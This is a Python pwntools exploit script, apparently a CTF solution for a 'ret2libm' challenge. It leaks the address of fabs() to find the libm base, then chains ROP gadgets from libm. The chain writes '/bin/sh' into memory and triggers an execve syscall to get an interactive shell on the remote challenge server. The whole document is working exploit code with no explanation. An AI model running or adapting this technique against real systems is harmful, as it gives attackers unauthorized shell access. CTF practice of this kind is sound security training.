from pwn import *

#p = process(["chal_patched"],env={"LD_PRELOAD":"./libm-2.27.so ./libc-2.27.so "})
p = remote("ret2libm.chal.irisc.tf",10001)
libm = ELF("./libm-2.27.so")
libc = ELF("./libc-2.27.so")

print(libm.plt)
"""
context.terminal = ["tmux","splitw","-h"]
gdb.attach(p, '''
set follow-fork-mode child
break execve
continue
''')
"""

print(p.recv())

inp  = input("Enter proof of work:")
print(len(inp))
p.send(inp)
p.recvuntil(b"pecs: ")
fabs_offset = libm.symbols['fabs']

addr = int(p.recvline().replace(b'\n',b''),16)
print("fabs offset: ",hex(fabs_offset))
print("fabs() function address: ",hex(addr))

libm_base = addr - fabs_offset

print("libm base:",hex(libm_base))

fputs_got = libm_base+ 0x39d070

syscall_gadget = libm_base+0x0000000000003f39
pop_rdi = libm_base+0x000000000000bc37
pop_rax = libm_base + 0x000000000001a3c8
pop_rsi = libm_base + 0x00000000000289d3
pop_rdx = libm_base + 0x000000000004c5c2

# 0x00000000000805b8 : mov qword ptr [rsi + rax*8 + 8], rdx ; pop rbx ; ret
interestinggadget = libm_base + 0x00000000000805b8
shval = 0x2f62696e2f736800
import time

print("fputs_got addr:",hex(fputs_got))
payload1 = p64(pop_rax) + p64(-1,signed=True) + p64(pop_rsi) + p64(fputs_got) + p64(pop_rdx) + p64(0x2f62696e2f736800)[::-1]+ p64(interestinggadget) + p64(0)
payload2 = p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(fputs_got) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(syscall_gadget)
p.sendline(b'a'*8+b'a'*8+payload1 + payload2)
p.sendline('ls')
p.interactive()
